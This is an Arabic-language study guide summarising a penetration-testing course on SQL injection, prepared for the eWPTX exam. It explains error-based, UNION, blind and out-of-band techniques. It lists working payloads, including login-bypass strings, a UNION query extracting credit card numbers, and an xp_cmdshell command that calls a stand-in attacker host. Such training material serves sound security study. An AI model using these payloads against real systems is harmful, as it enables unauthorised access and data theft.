# 🔴 Advanced Injection Attacks — شرح تفصيلي (Slides 1–50)

---

## 📌 الفكرة العامة للكورس

الكورس ده بيتكلم عن **Injection Attacks** (هجمات الحقن) — وهي من أخطر أنواع الهجمات على الـ Web Applications.

الفكرة الأساسية بسيطة: أي تطبيق بياخد input (مدخلات) من المستخدم ويبعتها للـ database أو لأي نظام تاني — ده تطبيق ممكن يُستغل.

**الكورس ده هيغطي 7 أنواع injection:**

| #   | النوع                    | الهدف                    |
| --- | ------------------------ | ------------------------ |
| 1   | **SQL Injection (SQLi)** | قواعد البيانات العلائقية |
| 2   | **SQLMap**               | أتمتة الاستغلال          |
| 3   | **Advanced SQLi**        | OOB + Second-Order       |
| 4   | **NoSQL Injection**      | MongoDB وغيرها           |
| 5   | **LDAP Injection**       | خدمات الـ Directory      |
| 6   | **ORM Injection**        | frameworks الـ ORM       |
| 7   | **XXE Injection**        | XML parsers              |

---

## 🎯 ما اللي المفروض تاخده من الـ 50 slide دول

بعد ما تقرأهم هتعرف:

- إيه هي الـ Injection Attacks وليه هي خطيرة
- إيه الفرق بين كل نوع من أنواع الـ SQLi
- إزاي تفكر زي المهاجم لما تبحث عن injection points
- إزاي تختبر يدوياً قبل ما تستخدم أي tool

---

## 📖 الشرح التفصيلي

---

### 🔷 1. ما هي Injection Attacks؟ (Slides 7–11)

#### الفكرة من منظور المهاجم

تخيل إنك بتكلم الـ application عبر input fields (خانات الإدخال) — زي خانة البحث أو login.

الـ application ده بياخد اللي كتبته وبيبعته للـ database بشكل مباشر زي كده:

```sql
SELECT * FROM users WHERE username = 'ما كتبته أنت'
```

لو الـ application مش بيتحقق من اللي بتكتبه — ممكن تكتب SQL code بدل الـ username العادي، وبالتالي **بتتحكم في الـ query اللي بتنفذها الـ database**.

#### تعريف الـ Injection Attack

**Injection Attack** (هجوم الحقن) هو: إنك تحقن (تدخل) كود خبيث في الـ input بدل البيانات العادية، والتطبيق بينفذه من غير ما يتحقق منه.

ده بيحصل لأن التطبيق **مش بيفرق بين البيانات والكود**.

#### خصائص الـ Injection Attacks

- **Exploitation of Input Validation**
- (استغلال ضعف التحقق من المدخلات): التطبيق مش بيعمل فلترة كافية على الـ input.
- **Manipulation of Queries or Commands**
- (التلاعب في الاستعلامات): الـ payload بيغير منطق الـ query اللي بتتنفذ.
- **Wide Range of Targets**
- (نطاق واسع من الأهداف): ممكن تأثر على databases، directory services، XML parsers، وحتى نظام التشغيل.

#### انتشار الـ Injection Attacks في الواقع

- **OWASP Top 10:** كانت **#1 في 2017** و**#3 في 2021** — من أكثر الثغرات خطورة وانتشاراً.
- **TalkTalk 2015:** SQLi → سرقة بيانات 157,000 عميل.
- **Equifax 2017:** SQLi ضمن ثغرات أدت لاختراق بيانات 147 مليون شخص.
- **LinkedIn 2012:** SQLi → سرقة 6.5 مليون password.

> **الدرس:** مش بس تطبيقات صغيرة بتتاثر — شركات عملاقة اتهاجمت بنفس الأسلوب.

---

### 🔷 2. مقدمة SQL Injection (Slides 13–19)

#### ما هو SQL Injection؟

**SQL Injection (SQLi)**
هو استغلال ثغرة في الـ web application بتسمح للمهاجم يحقن **SQL statements** (جمل SQL) خبيثة في الـ input fields.

الـ web applications بتستخدم **databases** (قواعد بيانات) لتخزين كل حاجة: بيانات المستخدمين، passwords، معلومات الكارت الائتماني، إلخ.

الـ databases دي بتتكلم بـ **SQL** (Structured Query Language — لغة الاستعلام المنظمة).

لما التطبيق مش بيتحقق من الـ input صح — المهاجم يقدر يكتب SQL code في الـ input ويوصل لبيانات ما كانش المفروض يشوفها.

#### الـ databases المتأثرة

- MySQL
- MSSQL (Microsoft SQL Server)
- Oracle
- PostgreSQL
- SQLite

كل دول ممكن يتأثروا بالـ SQLi — بس كل واحد ليه syntax خاص بيه شوية.

#### تاريخ الـ SQL Injection

|السنة|الحدث|
|---|---|
|1998|أول استخدام معروف — اختراق شبكة وزارة الطاقة الأمريكية|
|2000|أول هجوم SQLi معلن — سرقة بيانات كريدت كارد من CD Universe|
|2002|"The Helldiggers" اخترقوا قاعدة بيانات الأمم المتحدة|
|2012|LinkedIn — سرقة 6.5 مليون password|
|2015|Ashley Madison — سرقة بيانات حساسة لملايين المستخدمين|

#### تأثير الـ SQLi على أمن المعلومات (CIA Triad)

|المبدأ|التأثير|
|---|---|
|**Confidentiality** (السرية)|الوصول لبيانات سرية لم تكن مخصصة للعموم|
|**Integrity** (النزاهة)|تعديل أو حذف البيانات في الـ database|
|**Authentication** (المصادقة)|تجاوز صفحات الـ login بدون معرفة الباسورد|
|**Availability** (الإتاحة)|تعطيل التطبيق أو حذف البيانات بالكامل|

#### عواقب الـ SQLi

- **Data Breach** (اختراق البيانات): سرقة بيانات العملاء.
- **Data Manipulation** (التلاعب بالبيانات): تعديل أو حذف سجلات.
- **Code Execution** (تنفيذ كود): لو المستخدم admin ممكن تنفذ كود على السيرفر نفسه.
- **Business Disruption** (تعطيل الأعمال): إيقاف الموقع بالكامل.

---

### 🔷 3. أنواع الـ SQL Injection (Slides 21–31)

#### الخريطة الكاملة لأنواع الـ SQLi

```
SQL Injection
├── In-Band SQLi (النتيجة في نفس القناة)
│   ├── Error-Based SQLi
│   └── Union-Based SQLi
├── Blind SQLi (النتيجة مش ظاهرة مباشرة)
│   ├── Boolean-Based SQLi
│   └── Time-Based SQLi
└── Out-of-Band SQLi (قناة مختلفة تماماً)
```

---

#### 🟢 In-Band SQL Injection

**In-Band** (داخل نفس القناة) — ده النوع الأكثر شيوعاً.

**معناه:** المهاجم بيبعت الـ attack وبياخد النتيجة في **نفس الـ HTTP channel** — يعني في نفس الصفحة اللي بعت منها الـ request.

**ليه هو الأسهل؟** لأن الـ output (الناتج) بيظهر مباشرة في الـ response.

##### النوع الأول: Error-Based SQLi

**الفكرة:** المهاجم بيبعت payload غلط عن عمد عشان يخلي الـ database تطلع **error message** (رسالة خطأ) — وجوه المعلومات اللي محتاجها.

**مثال على الـ error اللي ممكن يظهر:**

```
MySQL Error: You have an error in your SQL syntax near '''' at line 1
Table 'users' - Column 'username' - Type: varchar(255)
```

الـ error ده بيقول للمهاجم اسم الـ table واسم الـ column ونوعه — معلومات ذهبية لبناء الـ attack.

**الـ flow:**

```
المهاجم → payload خبيث → التطبيق → Database → Error Message → المهاجم
                              ↑__________________________|
                              نفس القناة
```

##### النوع الثاني: Union-Based SQLi

**الفكرة:** المهاجم بيستخدم الـ `UNION` operator (عامل الاتحاد) عشان يجمع نتيجتين في استعلام واحد — النتيجة الأصلية + البيانات اللي عايز يسرقها.

**مثال:**

الـ query الأصلية:

```sql
SELECT id, name FROM users WHERE id = '1'
```

الـ payload المحقون:

```sql
' UNION SELECT credit_card_number, 'hacked' FROM credit_cards --
```

النتيجة في الـ browser:

```
| id | name  |
| 4532... | hacked |   ← بيانات الكريدت كارد ظاهرة!
```

> **شرط مهم:** الـ UNION بيشتغل بس لو عدد الـ columns في الـ SELECT الثاني **يساوي** عدد الـ columns في الـ SELECT الأول.

---

#### 🟡 Blind SQL Injection

**Blind** (أعمى) — التطبيق **مش بيرجع أي نتيجة** أو error للمهاجم في الـ response.

يعني المهاجم بيبعت payloads ومش شايف حاجة مباشرة — بس هو بيستنتج المعلومات من **سلوك التطبيق**.

##### النوع الأول: Boolean-Based Blind SQLi

**الفكرة:** المهاجم بيسأل التطبيق أسئلة "صح أو غلط" — ولو الصفحة بتتغير أو ما بتتغيرش بيعرف الإجابة.

**مثال:**

```sql
-- سؤال: هل الحرف الأول من اسم الـ database هو 'a'؟
' AND SUBSTRING(database(),1,1)='a' --
```

لو الصفحة رجعت كالعادة → الجواب صح ← الحرف فعلاً 'a'. لو الصفحة اتغيرت أو اختفت → الجواب غلط ← جرب 'b'.

المهاجم بيكرر ده **حرف حرف** لحد ما يعرف كل المعلومات — بطيء جداً بس بيشتغل.

```
المهاجم → "هل الـ username الأول = admin؟" → TRUE/FALSE
          → "هل الـ password أول حرفه 'p'؟" → TRUE/FALSE
          → بيكرر لحد ما يعرف الـ password كامل
```

##### النوع الثاني: Time-Based Blind SQLi

**الفكرة:** مفيش أي فرق في الـ response — لكن المهاجم بيضيف **تأخير زمني** (time delay) في الـ query، ولو التطبيق استجاب ببطء — يعني الـ injection اشتغل.

**مثال بـ MySQL:**

```sql
' OR SLEEP(5) --
```

الـ query بعد الـ injection:

```sql
SELECT * FROM users WHERE username = '' OR SLEEP(5) --'
```

لو الصفحة اتأخرت **5 ثواني** في الاستجابة → الـ injection شغال.

**ليه بيستخدمه المهاجم؟**

```sql
' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
```

لو اتأخر 5 ثواني → الحرف الأول من اسم الـ database هو 'a'.

---

#### 🔴 Out-of-Band SQL Injection (OOB)

**Out-of-Band** (خارج القناة) — ده النوع **الأقل شيوعاً** والأكثر تطوراً.

**الفكرة:** المهاجم بيبعت الـ attack من قناة (الـ HTTP request العادي) وبياخد النتيجة من **قناة تانية تماماً** — زي DNS queries أو HTTP requests لـ server خارجي تحت سيطرته.

**متى يستخدمه المهاجم؟**

- لما الـ WAF (Web Application Firewall) بيبلوك الـ in-band responses.
- لما التطبيق مش بيرجع أي output.
- لما الـ time-based مش شغال بسبب بطء السيرفر.

**مثال:**

```sql
' ; EXEC xp_cmdshell('nslookup attacker.com') --
```

الـ database بتعمل DNS lookup لـ `attacker.com` اللي المهاجم شايف اللوجز بتاعته — وبالتالي يعرف إن الـ injection اشتغل.

**الـ flow:**

```
المهاجم → Payload → التطبيق → Database → DNS/HTTP request → Server المهاجم
                                                              ↑
                                                    قناة مختلفة تماماً
```

---

### 🔷 4. إزاي تلاقي SQLi Vulnerabilities؟ (Slides 32–38)

#### أين تبحث؟ — Injectable Fields

المهاجم بيدور على أي مكان بيبعت فيه input للـ server:

|الـ Field|مثال|
|---|---|
|**Login Forms**|خانة username وpassword|
|**Search Boxes**|خانة البحث في الموقع|
|**URL Parameters**|`site.com/user.php?id=1`|
|**Form Fields**|نماذج التسجيل والتعليقات|
|**Hidden Fields**|`<input type="hidden" value="123">`|
|**Cookies**|بيانات الـ session|

#### طرق الاختبار

##### Manual Testing (الاختبار اليدوي)

الاختبار اليدوي هو الأهم — لأنك بتفهم وش بيحصل بدل ما تعتمد على tool بتجيب results مش فاهمها.

**الخطوة الأولى دايماً:** ابعت `'` (single quote) في الـ input.

لو طلع error → مبروك، عندك injection point.

**الأنواع:**

```
' -- String terminator (ينهي الـ string literal)
# -- SQL comment (يعلق باقي الـ query)
-- -- SQL comment (نسخة تانية)
' OR '1'='1 -- -- يخلي الـ condition دايماً True
' UNION SELECT null,null -- -- يختبر UNION injection
' AND SLEEP(5) -- -- يختبر Time-based
```

**قاعدة ذهبية:** اختبر parameter واحد في كل مرة — لو اختبرت أكتر من واحد مع بعض مش هتعرف أيهم اللي اشتغل.

##### Automated Testing (الاختبار الآلي)

- **SQLMap** — أشهر tool لاستغلال SQLi تلقائياً.
- **Burp Suite** — لـ scanning واليدوي.
- **OWASP ZAP** — بديل مجاني لـ Burp.

---

### 🔷 5. Integer vs String Based Injection (Slides 39–45)

#### مهم جداً: نوع الـ Parameter

مش كل الـ parameters بتتعامل مع البيانات بنفس الطريقة.

##### Integer-Based Injection (المتغير رقمي)

```
URL: site.com/user.php?id=1
```

الـ query:

```sql
SELECT * FROM Users WHERE id = 1
```

لاحظ: مفيش quotes حوالين الـ 1 — ده معناه الـ parameter integer (رقم صحيح).

**طريقة الاختبار:**

```sql
1 AND 1=1   -- True → الصفحة اتعرضت
1 AND 1=0   -- False → الصفحة اختفت أو اتغيرت
1 AND true  -- True
1 AND false -- False
1-false     -- = 1 لو vulnerable (بترجع 1)
1-true      -- = 0 لو vulnerable (بترجع 0)
1*56        -- = 56 لو vulnerable (بترجع 56)
```

##### String-Based Injection (المتغير نص)

```
URL: site.com/user.php?name=alexis
```

الـ query:

```sql
SELECT * FROM Users WHERE name = 'alexis'
```

لاحظ: في quotes حوالين القيمة — ده معناه string.

**طريقة الاختبار:**

```
'    → بيكسر الـ query (False/Error)
''   → يرجع True (يغلق string وبيفتحه تاني)
"    → بيكسر الـ query
""   → True
```

#### استغلال الـ Single Quote `'`

الـ single quote هو أهم character في الـ SQLi:

```
الـ query الأصلية:
SELECT * FROM users WHERE username = 'ahmed' AND password = '12345'

الـ payload:
' OR '1'='1'; --

الـ query بعد الـ injection:
SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '12345'
```

**ليه ده اشتغل؟**

1. `'` → أغلق الـ string اللي كان مفتوح.
2. `OR '1'='1'` → أضاف condition دايماً صح.
3. `; --` → قفل الـ statement وعلق باقي الـ query.

النتيجة: الـ database بترجع كل الـ users — التطبيق يعتبر الأول منهم logged in.

---

### 🔷 6. Database Fingerprinting وتحديد نوع الـ Database (Slide 46)

**Database Fingerprinting** (بصمة قاعدة البيانات) — تحديد نوع الـ database عشان تعرف تستخدم الـ payloads الصح.

كل database ليها رسائل خطأ مختلفة:

|الـ Database|رسالة الخطأ|
|---|---|
|**MySQL**|`You have an error in your SQL syntax... near '...'`|
|**MSSQL**|`Incorrect syntax near '...'`|
|**Oracle**|`ORA-00933: SQL command not properly ended`|
|**PostgreSQL**|`ERROR: unterminated quoted string at or near "..."`|

---

### 🔷 7. أهم الـ Payloads (Slides 47–48)

#### Common SQLi Payloads (عامة لكل database)

```sql
'                    -- يكسر الـ string
''                   -- يعيد الـ string
-- or #              -- SQL comments
' OR '1             -- يبدأ injection
' OR 1 -- -         -- bypass authentication
' OR '1'='1 --      -- دايماً True
Admin'--             -- bypass admin login
' or 1=1#            -- MySQL bypass
' HAVING 1=1--       -- يكشف column names
' OR SLEEP(5)--      -- Time-based test
```

#### Database-Specific Payloads

```sql
-- MySQL
' OR '1'='1' #
' OR '1'='1' /*

-- MSSQL, Oracle, PostgreSQL
' OR '1'='1' --

-- Access (null characters)
' OR '1'='1' %00
' OR '1'='1' %16
```

---

### 🔷 8. المصادر الأساسية (Slide 49–50)

#### Cheat Sheets — حفظها في Obsidian

|المصدر|الرابط|
|---|---|
|**PayloadBox SQLi List**|`https://github.com/payloadbox/sql-injection-payload-list`|
|**PortSwigger SQLi Cheat Sheet**|`https://portswigger.net/web-security/sql-injection/cheat-sheet`|
|**OWASP WSTG**|`https://owasp.org/www-project-web-security-testing-guide/`|
|**OWASP Testing Checklist**|`https://github.com/tanprathan/OWASP-Testing-Checklist`|

---

## 📊 جدول المصطلحات الموحد

|English Term|المعنى بالعربي|النطق|
|---|---|---|
|SQL Injection|حقن استعلامات SQL|إس-كيو-إل إنجكشن|
|Injection Attack|هجوم الحقن|إنجكشن أتاك|
|In-Band|داخل نفس القناة|إن-باند|
|Out-of-Band|خارج القناة|أوت-أوف-باند|
|Blind SQLi|الحقن الأعمى|بلايند إس-كيو-إل-آي|
|Error-Based|مبني على رسائل الخطأ|إيرور-بيسد|
|Union-Based|مبني على عامل UNION|يونيون-بيسد|
|Boolean-Based|مبني على منطق صح/غلط|بوليان-بيسد|
|Time-Based|مبني على التأخير الزمني|تايم-بيسد|
|Database Fingerprinting|تحديد نوع قاعدة البيانات|داتابيس فينجربرينتنج|
|Input Validation|التحقق من المدخلات|إنبوت فاليديشن|
|Payload|الكود الخبيث المحقون|بيلود|
|DBMS|نظام إدارة قواعد البيانات (Database Management System)|دي-بي-إم-إس|
|Integer-Based|المتغير من نوع رقم صحيح|إنتيجر-بيسد|
|String-Based|المتغير من نوع نص|سترينج-بيسد|
|SQL Comment|تعليق في الـ SQL (`--` أو `#`)|إس-كيو-إل كومنت|
|Single Quote|علامة الاقتباس المفردة `'`|سينجل كووت|
|UNION Operator|عامل دمج الاستعلامات|يونيون أوبيريتور|
|SLEEP()|دالة التأخير في MySQL|سليب|
|DNS Query|استعلام نظام أسماء النطاقات|دي-إن-إس كويري|
|WAF|جدار حماية تطبيقات الويب (Web Application Firewall)|واف|
|OWASP|مشروع أمان تطبيقات الويب المفتوح|أوواسب|
|CIA Triad|مثلث السرية، النزاهة، الإتاحة|سي-آي-إيه تريآد|
|Confidentiality|السرية|كونفيدنشيالتي|
|Integrity|النزاهة|إنتيجريتي|
|Availability|الإتاحة|أفيلابيلتي|

---

## ✅ الملخص النهائي

### الفكرة الجوهرية

الـ SQLi بيحصل لأن التطبيق **بيخلط بين البيانات والكود** — بياخد الـ input ويحطه مباشرة في الـ SQL query من غير ما يتحقق منه.

### الأنواع في جملة واحدة لكل نوع

|النوع|جملة واحدة|
|---|---|
|**Error-Based**|خلي الـ database تعمل error — المعلومات جوه الـ error|
|**Union-Based**|اضم استعلامك الخبيث على الاستعلام الأصلي|
|**Boolean-Based**|اسأل أسئلة صح/غلط واستنتج البيانات من ردود الفعل|
|**Time-Based**|خلي الـ database تتأخر عشان تتأكد من الـ injection|
|**OOB**|ابعت النتائج لـ server تاني تحت سيطرتك|

### منهجية الاختبار (حفظها)

```
1. شوف كل الـ input fields
2. اختبر كل field لوحده بـ '
3. شوف الـ response — error؟ تغيير في الصفحة؟ تأخير؟
4. حدد نوع الـ injection
5. ابني الـ payload المناسب
```

### ليه الـ SQLi مهم جداً في الـ eWPTX؟

لأن الـ eWPTX بيطلب منك تعرف:

- تكشف الـ injection manually (بدون tools في الأول)
- تفهم نوع الـ database عشان تختار الـ payload الصح
- تستخدم SQLMap بفاعلية
- تعرف تتعامل مع الـ Blind injection

كل ده اتغطى في الـ 50 slide دول.